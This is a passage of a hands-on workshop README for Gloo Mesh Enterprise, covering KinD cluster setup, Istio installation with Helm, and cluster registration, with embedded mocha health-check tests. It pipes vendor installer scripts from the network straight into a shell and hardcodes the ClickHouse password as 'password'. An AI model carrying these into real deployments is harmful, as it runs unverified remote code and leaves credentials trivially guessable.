
<!--bash
#!/usr/bin/env bash

source ./scripts/assert.sh
-->



![Gloo Mesh Enterprise](images/gloo-mesh-enterprise.png)
# <center>Gloo Platform Workshop</center>



## Table of Contents
* [Introduction](#introduction)
* [Lab 1 - Deploy KinD clusters](#lab-1---deploy-kind-clusters-)
* [Lab 2 - Deploy Istio](#lab-2---deploy-istio-)
* [Lab 3 - Deploy and register Gloo Mesh](#lab-3---deploy-and-register-gloo-mesh-)
* [Lab 4 - Deploy the Bookinfo demo app](#lab-4---deploy-the-bookinfo-demo-app-)
* [Lab 5 - Deploy the httpbin demo app](#lab-5---deploy-the-httpbin-demo-app-)
* [Lab 6 - Deploy Gloo Mesh Addons](#lab-6---deploy-gloo-mesh-addons-)
* [Lab 7 - Create the gateways workspace](#lab-7---create-the-gateways-workspace-)
* [Lab 8 - Create the bookinfo workspace](#lab-8---create-the-bookinfo-workspace-)
* [Lab 9 - Expose the productpage through a gateway](#lab-9---expose-the-productpage-through-a-gateway-)
* [Lab 10 - Traffic policies](#lab-10---traffic-policies-)
* [Lab 11 - Create the Root Trust Policy](#lab-11---create-the-root-trust-policy-)
* [Lab 12 - Leverage Virtual Destinations](#lab-12---leverage-virtual-destinations-)
* [Lab 13 - Zero trust](#lab-13---zero-trust-)
* [Lab 14 - Apply rate limiting to east west communication](#lab-14---apply-rate-limiting-to-east-west-communication-)
* [Lab 15 - See how Gloo Platform can help with observability](#lab-15---see-how-gloo-platform-can-help-with-observability-)
* [Lab 16 - Create the httpbin workspace](#lab-16---create-the-httpbin-workspace-)
* [Lab 17 - Expose an external service](#lab-17---expose-an-external-service-)
* [Lab 18 - Deploy Keycloak](#lab-18---deploy-keycloak-)
* [Lab 19 - Securing the access with OAuth](#lab-19---securing-the-access-with-oauth-)
* [Lab 20 - Use the transformation filter to manipulate headers](#lab-20---use-the-transformation-filter-to-manipulate-headers-)
* [Lab 21 - Use the DLP policy to mask sensitive data](#lab-21---use-the-dlp-policy-to-mask-sensitive-data-)
* [Lab 22 - Apply rate limiting to the Gateway](#lab-22---apply-rate-limiting-to-the-gateway-)
* [Lab 23 - Use the Web Application Firewall filter](#lab-23---use-the-web-application-firewall-filter-)
* [Lab 24 - Expose the bookinfo application through GraphQL](#lab-24---expose-the-bookinfo-application-through-graphql-)
* [Lab 25 - Deploy the Amazon pod identity webhook](#lab-25---deploy-the-amazon-pod-identity-webhook-)
* [Lab 26 - Execute Lambda functions](#lab-26---execute-lambda-functions-)
* [Lab 27 - Expose the productpage API securely](#lab-27---expose-the-productpage-api-securely-)
* [Lab 28 - Expose an external API and stitch it with another one](#lab-28---expose-an-external-api-and-stitch-it-with-another-one-)
* [Lab 29 - Expose the dev portal backend](#lab-29---expose-the-dev-portal-backend-)
* [Lab 30 - Deploy and expose the dev portal frontend](#lab-30---deploy-and-expose-the-dev-portal-frontend-)
* [Lab 31 - Allow users to create their own API keys](#lab-31---allow-users-to-create-their-own-api-keys-)
* [Lab 32 - Dev portal monetization](#lab-32---dev-portal-monetization-)
* [Lab 33 - VM integration](#lab-33---vm-integration-)
* [Lab 34 - Gloo Mesh Management Plane failover](#lab-34---gloo-mesh-management-plane-failover-)



## Introduction <a name="introduction"></a>

[Gloo Mesh Enterprise](https://www.solo.io/products/gloo-mesh/) is a management plane which makes it easy to operate [Istio](https://istio.io) on one or many Kubernetes clusters deployed anywhere (any platform, anywhere).

### Istio support

The Gloo Mesh Enterprise subscription includes end to end Istio support:

- Upstream first
- Specialty builds available (FIPS, ARM, etc)
- Long Term Support (LTS) N-4 
- Critical security patches
- Production break-fix
- One hour SLA Severity 1
- Install / upgrade
- Architecture and operational guidance, best practices

### Gloo Mesh overview

Gloo Mesh provides many unique features, including:

- multi-tenancy based on global workspaces
- zero trust enforcement
- global observability (centralized metrics and access logging)
- simplified cross cluster communications (using virtual destinations)
- advanced gateway capabilities (oauth, jwt, transformations, rate limiting, web application firewall, ...)

![Gloo Mesh graph](images/gloo-mesh-graph.png)

### Want to learn more about Gloo Mesh

You can find more information about Gloo Mesh in the official documentation:

[https://docs.solo.io/gloo-mesh/latest/](https://docs.solo.io/gloo-mesh/latest/)




## Lab 1 - Deploy KinD clusters <a name="lab-1---deploy-kind-clusters-"></a>


Clone this repository and go to the directory where this `README.md` file is.

Set the context environment variables:

```bash
export MGMT=mgmt
export CLUSTER1=cluster1
export CLUSTER2=cluster2
```

Run the following commands to deploy three Kubernetes clusters using [Kind](https://kind.sigs.k8s.io/):

```bash
./scripts/deploy-aws.sh 1 mgmt
./scripts/deploy-aws.sh 2 cluster1 us-west us-west-1
./scripts/deploy-aws.sh 3 cluster2 us-west us-west-2
```

Then run the following commands to wait for all the Pods to be ready:

```bash
./scripts/check.sh mgmt
./scripts/check.sh cluster1
./scripts/check.sh cluster2
```

**Note:** If you run the `check.sh` script immediately after the `deploy.sh` script, you may see a jsonpath error. If that happens, simply wait a few seconds and try again.

Once the `check.sh` script completes, when you execute the `kubectl get pods -A` command, you should see the following:

```
NAMESPACE            NAME                                          READY   STATUS    RESTARTS   AGE
kube-system          calico-kube-controllers-59d85c5c84-sbk4k      1/1     Running   0          4h26m
kube-system          calico-node-przxs                             1/1     Running   0          4h26m
kube-system          coredns-6955765f44-ln8f5                      1/1     Running   0          4h26m
kube-system          coredns-6955765f44-s7xxx                      1/1     Running   0          4h26m
kube-system          etcd-cluster1-control-plane                   1/1     Running   0          4h27m
kube-system          kube-apiserver-cluster1-control-plane         1/1     Running   0          4h27m
kube-system          kube-controller-manager-cluster1-control-plane1/1     Running   0          4h27m
kube-system          kube-proxy-ksvzw                              1/1     Running   0          4h26m
kube-system          kube-scheduler-cluster1-control-plane         1/1     Running   0          4h27m
local-path-storage   local-path-provisioner-58f6947c7-lfmdx        1/1     Running   0          4h26m
metallb-system       controller-5c9894b5cd-cn9x2                   1/1     Running   0          4h26m
metallb-system       speaker-d7jkp                                 1/1     Running   0          4h26m
```

You can see that your currently connected to this cluster by executing the `kubectl config get-contexts` command:

```
CURRENT   NAME         CLUSTER         AUTHINFO   NAMESPACE  
          cluster1     kind-cluster1   cluster1
*         cluster2     kind-cluster2   cluster2
          mgmt         kind-mgmt       kind-mgmt
```

Run the following command to make `mgmt` the current cluster.

```bash
kubectl config use-context ${MGMT}
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Clusters are healthy", () => {
    const clusters = [process.env.MGMT, process.env.CLUSTER1, process.env.CLUSTER2];
    clusters.forEach(cluster => {
        it(`Cluster ${cluster} is healthy`, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "default", k8sType: "service", k8sObj: "kubernetes" }));
    });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-kind-clusters/tests/cluster-healthy.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 2 - Deploy Istio <a name="lab-2---deploy-istio-"></a>

We are going to deploy Istio using Helm, but there are several other options. You can find more information in the [Istio documentation](https://istio.io/latest/docs/setup/install/).

First of all, let's Download the Istio release 1.18.3:

```bash
export ISTIO_VERSION=1.18.3
curl -L https://istio.io/downloadIstio | sh -
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("istioctl version", () => {
  it("version should be correct", () => helpers.genericCommand({ responseContains: "1.18.3", command: "./istio-1.18.3/bin/istioctl version --remote=false" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-istio/tests/istio-version.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Then, you need to create the `istio-system` and the `istio-gateways` namespaces on the first cluster.

```bash
kubectl --context ${CLUSTER1} create ns istio-system
kubectl --context ${CLUSTER1} create ns istio-gateways
```

Now, let's deploy the Istio control plane on the first cluster:

```bash
helm --kube-context=${CLUSTER1} upgrade --install istio-base ./istio-1.18.3/manifests/charts/base -n istio-system --set defaultRevision=1-18

helm --kube-context=${CLUSTER1} upgrade --install istio-1.18.3 ./istio-1.18.3/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF

revision: 1-18
global:
  meshID: mesh1
  multiCluster:
    clusterName: cluster1
  network: cluster1
  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
  tag: 1.18.3-solo
meshConfig:
  trustDomain: cluster1
  accessLogFile: /dev/stdout
  enableAutoMtls: true
  defaultConfig:
    proxyMetadata:
      ISTIO_META_DNS_CAPTURE: "true"
      ISTIO_META_DNS_AUTO_ALLOCATE: "true"
pilot:
  env:
    PILOT_ENABLE_K8S_SELECT_WORKLOAD_ENTRIES: "false"
    PILOT_SKIP_VALIDATE_TRUST_DOMAIN: "true"

EOF
```

Note that we set the `trust domain` to be the same as the cluster name and we configure the sidecars to send their metrics and access logs to the Gloo Mesh agent.

After that, you can deploy the gateway(s):

```bash
kubectl --context ${CLUSTER1} label namespace istio-gateways istio.io/rev=1-18 --overwrite

helm --kube-context=${CLUSTER1} upgrade --install istio-ingressgateway ./istio-1.18.3/manifests/charts/gateway -n istio-gateways --values - <<EOF
name: istio-ingressgateway
labels:
  istio: ingressgateway
service:
  ports:
  - name: http2
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
EOF

helm --kube-context=${CLUSTER1} upgrade --install istio-eastwestgateway ./istio-1.18.3/manifests/charts/gateway -n istio-gateways --values - <<EOF
name: istio-eastwestgateway
labels:
  app: istio-ingressgateway
  istio: eastwestgateway
  topology.istio.io/network: cluster1
service:
  ports:
  - name: tcp-status-port
    port: 15021
    targetPort: 15021
  - name: https
    port: 16443
    targetPort: 16443
  - name: tls
    port: 15443
    targetPort: 15443
  - name: tcp-istiod
    port: 15012
    targetPort: 15012
  - name: tcp-webhook
    port: 15017
    targetPort: 15017
env:
  ISTIO_META_ROUTER_MODE: "sni-dnat"
  ISTIO_META_REQUESTED_NETWORK_VIEW: "cluster1"
EOF
```

As you can see, we deploy the control plane (istiod) in the `istio-system` and gateway(s) in the `istio-gateways` namespace.

One gateway will be used for ingress traffic while the other one will be used for cross cluster communications. It's not mandatory to use separate gateways, but it's a best practice.

Run the following command until all the Istio Pods are ready:

```bash
kubectl --context ${CLUSTER1} get pods -n istio-system && kubectl --context ${CLUSTER1} get pods -n istio-gateways
```

When they are ready, you should get this output:

```
NAME                      READY   STATUS    RESTARTS   AGE
istiod-5c669bcf6f-2hn6c   1/1     Running   0          3m7s
NAME                                     READY   STATUS    RESTARTS   AGE
istio-eastwestgateway-77f79cdb47-f4r7k   1/1     Running   0          2m53s
istio-ingressgateway-744fcf4fb-5dc7q     1/1     Running   0          2m44s
```
You need to create the `istio-system` and the `istio-gateways` namespaces on the second cluster.

```bash
kubectl --context ${CLUSTER2} create ns istio-system
kubectl --context ${CLUSTER2} create ns istio-gateways
```

Now, let's deploy the Istio control plane on the second cluster:

```bash
helm --kube-context=${CLUSTER2} upgrade --install istio-base ./istio-1.18.3/manifests/charts/base -n istio-system --set defaultRevision=1-18

helm --kube-context=${CLUSTER2} upgrade --install istio-1.18.3 ./istio-1.18.3/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF

revision: 1-18
global:
  meshID: mesh1
  multiCluster:
    clusterName: cluster2
  network: cluster2
  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
  tag: 1.18.3-solo
meshConfig:
  trustDomain: cluster2
  accessLogFile: /dev/stdout
  enableAutoMtls: true
  defaultConfig:
    proxyMetadata:
      ISTIO_META_DNS_CAPTURE: "true"
      ISTIO_META_DNS_AUTO_ALLOCATE: "true"
pilot:
  env:
    PILOT_ENABLE_K8S_SELECT_WORKLOAD_ENTRIES: "false"
    PILOT_SKIP_VALIDATE_TRUST_DOMAIN: "true"

EOF
```

After that, you can deploy the gateways:

```bash
kubectl --context ${CLUSTER2} label namespace istio-gateways istio.io/rev=1-18 --overwrite

helm --kube-context=${CLUSTER2} upgrade --install istio-ingressgateway ./istio-1.18.3/manifests/charts/gateway -n istio-gateways --values - <<EOF
name: istio-ingressgateway
labels:
  istio: ingressgateway
service:
  ports:
  - name: http2
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
EOF

helm --kube-context=${CLUSTER2} upgrade --install istio-eastwestgateway ./istio-1.18.3/manifests/charts/gateway -n istio-gateways --values - <<EOF
name: istio-eastwestgateway
labels:
  app: istio-ingressgateway
  istio: eastwestgateway
  topology.istio.io/network: cluster2
service:
  ports:
  - name: tcp-status-port
    port: 15021
    targetPort: 15021
  - name: https
    port: 16443
    targetPort: 16443
  - name: tls
    port: 15443
    targetPort: 15443
  - name: tcp-istiod
    port: 15012
    targetPort: 15012
  - name: tcp-webhook
    port: 15017
    targetPort: 15017
env:
  ISTIO_META_ROUTER_MODE: "sni-dnat"
  ISTIO_META_REQUESTED_NETWORK_VIEW: "cluster2"
EOF
```

<!--bash
cat <<'EOF' > ./test.js

const helpers = require('./tests/chai-exec');

const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
const chai = require("chai");
const expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Checking Istio installation", function() {
  let deployments = ["istiod-1-18"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "istio-system", k8sObj: deploy }));
  });
  deployments = ["istio-eastwestgateway", "istio-ingressgateway"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "istio-gateways", k8sObj: deploy }));
  });
  deployments = ["istiod-1-18"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER2, () => helpers.checkDeployment({ context: process.env.CLUSTER2, namespace: "istio-system", k8sObj: deploy }));
  });
  deployments = ["istio-eastwestgateway", "istio-ingressgateway"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER2, () => helpers.checkDeployment({ context: process.env.CLUSTER2, namespace: "istio-gateways", k8sObj: deploy }));
  });
  it("Ingress gateways have an ip attached in cluster " + process.env.CLUSTER1, () => {
    let cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer}'");
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
    cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n istio-gateways get svc istio-eastwestgateway -o jsonpath='{.status.loadBalancer}'");
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
    
  });
  it("Ingress gateways have an ip attached in cluster " + process.env.CLUSTER2, () => {
    let cli = chaiExec("kubectl --context " + process.env.CLUSTER2 + " -n istio-gateways get svc istio-eastwestgateway  -o jsonpath='{.status.loadBalancer}'");
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
    cli = chaiExec("kubectl --context " + process.env.CLUSTER2 + " -n istio-gateways get svc istio-ingressgateway  -o jsonpath='{.status.loadBalancer}'");
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-istio/tests/istio-ready.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Check the status on the second cluster using:

```bash
kubectl --context ${CLUSTER2} get pods -n istio-system && kubectl --context ${CLUSTER2} get pods -n istio-gateways
```
<!--bash
until [[ $(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done
-->

```bash
export HOST_GW_CLUSTER1="$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}')"
export HOST_GW_CLUSTER2="$(kubectl --context ${CLUSTER2} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}')"
```
<!--bash
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_GW_CLUSTER1 + "' can be resolved in DNS", () => {
    it(process.env.HOST_GW_CLUSTER1 + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_GW_CLUSTER1, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_GW_CLUSTER2 + "' can be resolved in DNS", () => {
    it(process.env.HOST_GW_CLUSTER2 + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_GW_CLUSTER2, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->




## Lab 3 - Deploy and register Gloo Mesh <a name="lab-3---deploy-and-register-gloo-mesh-"></a>
[<img src="https://img.youtube.com/vi/djfFiepK4GY/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/djfFiepK4GY "Video Link")


Before we get started, let's install the `meshctl` CLI:

```bash
export GLOO_MESH_VERSION=v2.4.6
curl -sL https://run.solo.io/meshctl/install | sh -
export PATH=$HOME/.gloo-mesh/bin:$PATH
```
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;

describe("Required environment variables should contain value", () => {
  afterEach(function(done){
    if(this.currentTest.currentRetry() > 0){
      process.stdout.write(".");
       setTimeout(done, 1000);
    } else {
      done();
    }
  });

  it("Context environment variables should not be empty", () => {
    expect(process.env.MGMT).to.not.be.empty
    expect(process.env.CLUSTER1).to.not.be.empty
    expect(process.env.CLUSTER2).to.not.be.empty
  });

  it("Gloo Mesh licence environment variables should not be empty", () => {
    expect(process.env.GLOO_MESH_LICENSE_KEY).to.not.be.empty
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-and-register-gloo-mesh/tests/environment-variables.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
First, create a secret with the password to use to store access logs in Clickhouse:

```bash
cat << EOF | kubectl --context ${MGMT} apply -f -
kind: Namespace
apiVersion: v1
metadata:
  name: gloo-mesh
---
apiVersion: v1
kind: Secret
metadata:
  name: clickhouse-auth
  namespace: gloo-mesh
type: Opaque
stringData:
  password: password
EOF
```

And then, install the Helm charts:

```bash
helm repo add gloo-platform https://storage.googleapis.com/gloo-platform/helm-charts
helm repo update
kubectl --context ${MGMT} create ns gloo-mesh
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds \
--namespace gloo-mesh \
--kube-context ${MGMT} \
--version=2.4.6
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
--namespace gloo-mesh \
--kube-context ${MGMT} \
--version=2.4.6 \
 -f -<<EOF
licensing:
  licenseKey: ${GLOO_MESH_LICENSE_KEY}
common:
  cluster: mgmt
glooMgmtServer:
  enabled: true
  ports:
    healthcheck: 8091
prometheus:
  enabled: true
redis:
  deployment:
    enabled: true
clickhouse:
  enabled: true
  persistence:
    enabled: false
telemetryGateway:
  enabled: true
  service:
    type: LoadBalancer
telemetryGatewayCustomization:
  pipelines:
    logs/clickhouse:
      enabled: true
  extraExporters:
    clickhouse:
      password: password
glooUi:
  enabled: true
  serviceType: LoadBalancer
telemetryCollector:
  enabled: true
EOF
kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
```

<!--bash
kubectl wait --context ${MGMT} --for=condition=Ready -n gloo-mesh --all pod
timeout 2m bash -c "until [[ \$(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done"
-->
Then, you need to set the environment variable to tell the Gloo Mesh agents how to communicate with the management plane:<!--bash
cat <<'EOF' > ./test.js

const helpers = require('./tests/chai-exec');

describe("MGMT server is healthy", () => {
  let cluster = process.env.MGMT
  let deployments = ["gloo-mesh-mgmt-server","gloo-mesh-redis","gloo-telemetry-gateway","prometheus-server"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-mesh", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-and-register-gloo-mesh/tests/check-deployment.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--><!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-and-register-gloo-mesh/tests/get-gloo-mesh-mgmt-server-ip.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

```bash
export ENDPOINT_GLOO_MESH=$(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server -o jsonpath='{.status.loadBalancer.ingress[0].*}'):9900
export HOST_GLOO_MESH=$(echo ${ENDPOINT_GLOO_MESH%:*})
export ENDPOINT_TELEMETRY_GATEWAY=$(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-telemetry-gateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):4317
export ENDPOINT_GLOO_MESH_UI=$(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-ui -o jsonpath='{.status.loadBalancer.ingress[0].*}'):8090
```

Check that the variables have correct values:
```
echo $HOST_GLOO_MESH
echo $ENDPOINT_GLOO_MESH
```

<!--bash
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_GLOO_MESH + "' can be resolved in DNS", () => {
    it(process.env.HOST_GLOO_MESH + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_GLOO_MESH, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
Finally, you need to register the cluster(s).

Here is how you register the first one:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: KubernetesCluster
metadata:
  name: cluster1
  namespace: gloo-mesh
spec:
  clusterDomain: cluster.local
EOF
kubectl --context ${CLUSTER1} create ns gloo-mesh
kubectl get secret relay-root-tls-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.ca\.crt}' | base64 -d > ca.crt
kubectl create secret generic relay-root-tls-secret -n gloo-mesh --context ${CLUSTER1} --from-file ca.crt=ca.crt
rm ca.crt

kubectl get secret relay-identity-token-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.token}' | base64 -d > token
kubectl create secret generic relay-identity-token-secret -n gloo-mesh --context ${CLUSTER1} --from-file token=token
rm token
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds  \
--namespace=gloo-mesh \
--kube-context=${CLUSTER1} \
--version=2.4.6
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace=gloo-mesh \
  --kube-context=${CLUSTER1} \
  --version=2.4.6 \
 -f -<<EOF
common:
  cluster: cluster1
glooAgent:
  enabled: true
  relay:
    serverAddress: "${ENDPOINT_GLOO_MESH}"
    authority: gloo-mesh-mgmt-server.gloo-mesh
telemetryCollector:
  presets:
    logsCollection:
      enabled: true
      storeCheckpoints: true
  enabled: true
  config:
    exporters:
      otlp:
        endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
telemetryCollectorCustomization:
  pipelines:
    logs/istio_access_logs:
      enabled: true
  extraExporters:
    clickhouse:
      password: password
EOF
```

Note that the registration can also be performed using `meshctl cluster register`.

And here is how you register the second one:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: KubernetesCluster
metadata:
  name: cluster2
  namespace: gloo-mesh
spec:
  clusterDomain: cluster.local
EOF
kubectl --context ${CLUSTER2} create ns gloo-mesh
kubectl get secret relay-root-tls-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.ca\.crt}' | base64 -d > ca.crt
kubectl create secret generic relay-root-tls-secret -n gloo-mesh --context ${CLUSTER2} --from-file ca.crt=ca.crt
rm ca.crt

kubectl get secret relay-identity-token-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.token}' | base64 -d > token
kubectl create secret generic relay-identity-token-secret -n gloo-mesh --context ${CLUSTER2} --from-file token=token
rm token
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds  \
--namespace=gloo-mesh \
--kube-context=${CLUSTER2} \
--version=2.4.6
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace=gloo-mesh \
  --kube-context=${CLUSTER2} \
  --version=2.4.6 \
 -f -<<EOF
common:
  cluster: cluster2
glooAgent:
  enabled: true
  relay:
    serverAddress: "${ENDPOINT_GLOO_MESH}"
    authority: gloo-mesh-mgmt-server.gloo-mesh
telemetryCollector:
  presets:
    logsCollection:
      enabled: true
      storeCheckpoints: true
  enabled: true
  config:
    exporters:
      otlp:
        endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
telemetryCollectorCustomization:
  pipelines:
    logs/istio_access_logs:
      enabled: true
  extraExporters:
    clickhouse:
      password: password
EOF
```

You can check the cluster(s) have been registered correctly using the following commands:
```
meshctl --kubecontext ${MGMT} check
```

```
pod=$(kubectl --context ${MGMT} -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${MGMT} -n gloo-mesh debug -q -i ${pod} --image=curlimages/curl -- curl -s http://localhost:9091/metrics | grep relay_push_clients_connected
```

You should get an output similar to this:
```,nocopy
# HELP relay_push_clients_connected Current number of connected Relay push clients (Relay Agents).
# TYPE relay_push_clients_connected gauge
relay_push_clients_connected{cluster="cluster1"} 1
relay_push_clients_connected{cluster="cluster2"} 1
```
Finally, you need to specify which gateways you want to use for cross cluster traffic:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: global
  namespace: gloo-mesh
spec:
  options:
    eastWestGateways:
      - selector:
          labels:
            istio: eastwestgateway
EOF
```
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Cluster registration", () => {
  it("cluster1 is registered", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
    expect(command).to.contain("cluster1");
  });
  it("cluster2 is registered", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
    expect(command).to.contain("cluster2");
  });
});
EOF
